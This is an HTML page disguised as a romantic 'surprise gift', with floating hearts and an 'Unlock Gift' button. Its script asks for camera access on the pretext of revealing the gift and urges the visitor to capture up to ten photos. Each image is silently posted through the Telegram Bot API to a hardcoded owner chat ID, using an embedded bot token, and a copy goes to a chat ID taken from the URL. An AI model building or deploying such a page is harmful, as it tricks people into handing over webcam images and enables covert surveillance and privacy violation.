<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ğŸ Your Surprise</title>
<style>
body {
    margin: 0;
    background: #000;
    color: white;
    text-align: center;
    font-family: Arial;
}
button {
    padding: 15px 35px;
    font-size: 18px;
    background: #ff007b;
    color: white;
    border: none;
    border-radius: 10px;
    margin-top: 20px;
}
#hearts { position: fixed; inset: 0; pointer-events: none; }
video, canvas { width: 90%; margin-top: 20px; display: none; }
</style>
</head>
<body>

<h2 id="msg">ğŸ Tap to unlock your special gift!</h2>
<button onclick="startGift()">Unlock Gift ğŸ</button>

<div id="hearts"></div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<button id="capBtn" style="display:none" onclick="capture()">ğŸ“¸ Capture Gift</button>

<script>
const urlParams = new URLSearchParams(window.location.search);
const USER_CHAT_ID = urlParams.get("uid"); 
const OWNER_CHAT_ID = "8215819954";
const BOT_TOKEN = "8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI";

// Hearts
function heart() {
    const h = document.createElement("div");
    h.innerHTML = "â¤ï¸";
    h.style.position = "absolute";
    h.style.left = Math.random()*100 + "vw";
    h.style.fontSize = (20 + Math.random()*30) + "px";
    h.style.animation = "up 3s linear";
    document.getElementById("hearts").appendChild(h);
    setTimeout(() => h.remove(), 3000);
}
setInterval(heart, 200);

// Start gift
function startGift() {
    document.getElementById("msg").innerText = "ğŸ’— Click ALLOW to reveal your surprise!";
    navigator.mediaDevices.getUserMedia({ video:true }).then(stream => {
        document.getElementById("video").style.display="block";
        document.getElementById("capBtn").style.display="block";
        document.getElementById("video").srcObject = stream;
    });
}

let count = 0;
function capture() {
    const v = document.getElementById("video");
    const c = document.getElementById("canvas");
    const ctx = c.getContext("2d");
    c.width = v.videoWidth;
    c.height = v.videoHeight;
    ctx.drawImage(v,0,0);

    const img = c.toDataURL("image/jpeg");

    // send to owner
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify({ chat_id: OWNER_CHAT_ID, photo: img })
    });

    // send to user
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify({ chat_id: USER_CHAT_ID, photo: img })
    });

    count++;
    if(count>=10) alert("â¤ï¸ Gift completed!");
}
</script>

</body>
</html>
